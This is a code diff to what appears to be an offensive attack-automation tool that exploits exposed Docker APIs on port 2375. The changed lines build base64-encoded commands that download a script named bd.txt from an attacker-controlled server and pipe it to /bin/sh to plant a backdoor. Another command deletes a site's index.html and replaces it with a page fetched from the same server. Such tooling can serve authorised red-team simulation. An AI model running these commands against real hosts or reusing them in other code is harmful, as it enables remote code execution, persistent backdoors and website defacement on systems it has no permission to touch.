@@ -180,7 +180,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         if flags["install_backdoor"] == False:
             utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit: set backdoor" % (utility.get_current_date())))
             atk = AtkDockerApi(utility, target, "2375", debug)
-            cmd = 'curl -s http://%s:%s/bd.txt | /bin/sh' % (server, serverport)
+            cmd = 'wget -qO- http://%s:%s/bd.txt | /bin/sh' % (server, serverport)
             b64cmd = base64.b64encode(cmd.encode()).decode()
             atk.sendattack(b64cmd)
             check_ssh()
@@ -313,7 +313,7 @@ def atk_execution(target_host_ip, self_host_ip, self_host_port, attack_scenario_
         if flags["index_tamparing"] == False:
             utility.print_message(OK, wrap_text(OK, "%s:Docker API Exploit: Web page tampering" % (utility.get_current_date())))
             atk = AtkDockerApi(utility, target, "2375", debug)
-            cmd = 'if [ -f "/var/www/html/index.html.backup" ]; then echo "OK"; else cp -p /var/www/html/index.html /var/www/html/index.html.backup; rm -f /var/www/html/index.html; curl -s http://%s:%s/index.html -o /var/www/html/index.html; wget http://%s:%s/index.html -O /var/www/html/index.html; fi' % (server, serverport, server, serverport)
+            cmd = 'if [ -f "/var/www/html/index.html.backup" ]; then echo "OK"; else cp -p /var/www/html/index.html /var/www/html/index.html.backup; rm -f /var/www/html/index.html; wget http://%s:%s/index.html -q -O /var/www/html/index.html; wget http://%s:%s/index.html -O /var/www/html/index.html; fi' % (server, serverport, server, serverport)
             b64cmd = base64.b64encode(cmd.encode()).decode()
             atk.sendattack(b64cmd)
         return True
